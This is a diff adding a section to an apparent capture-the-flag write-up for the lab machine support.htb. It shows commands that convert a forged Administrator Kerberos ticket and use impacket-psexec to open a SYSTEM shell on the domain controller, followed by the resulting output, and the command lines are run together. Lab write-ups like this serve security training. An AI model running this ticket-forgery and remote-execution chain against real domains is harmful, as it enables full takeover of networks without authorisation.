@@ -1518,6 +1518,40 @@ With the DC configured to trust `FAKE-COMP01$`, Rubeus uses that account's Kerb
 <br>
 </div>
 
+### 4.9 Convert the Ticket and Open a SYSTEM Shell
+
+The forged `Administrator` ticket is in `.kirbi` format; converting it to Impacket's `.ccache` allows `psexec.py` to authenticate to the DC over Kerberos and execute as SYSTEM.
+
+**Command:**
+
+```
+cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbiimpacket-ticketConverter ticket.kirbi ticket.ccacheKRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+```
+
+**Breakdown:**
+
+- `tr -d '[:space:]' | base64 -d`
+    - **Description:** Strips display whitespace, then Base64-decodes to the raw ticket.
+    - **Purpose:** Reconstructs the binary `.kirbi` from Rubeus's formatted output.
+- `impacket-ticketConverter ticket.kirbi ticket.ccache`
+    - **Description:** Converts a Windows `.kirbi` ticket to a Linux `.ccache` credential cache.
+    - **Purpose:** Produces the format Impacket tools read for Kerberos auth.
+- `KRB5CCNAME=ticket.ccache`
+    - **Description:** Environment variable pointing Kerberos to the ticket cache.
+    - **Purpose:** Supplies the impersonation ticket to `psexec.py`.
+- `impacket-psexec ... -k -no-pass`
+    - **Description:** PsExec-style remote execution; `-k` uses Kerberos, `-no-pass` skips password auth.
+    - **Purpose:** Authenticates to the DC with the forged ticket and launches a SYSTEM shell.
+
+**Result:**
+
+```
+[*] Found writable share ADMIN$[*] Uploading file PpITEHDH.exe[*] Creating service ySkE on dc.support.htb.....[*] Starting service ySkE.....Microsoft Windows [Version 10.0.20348.859]C:\Windows\system32>
+```
+
+_What this gives you:_ **Key finding:** an interactive shell on the Domain Controller as `NT AUTHORITY\SYSTEM` — full compromise of the domain.
+
+_Next:_ Capture the root flag to complete the engagement.
 <div align="center">
 <br>
 <br>
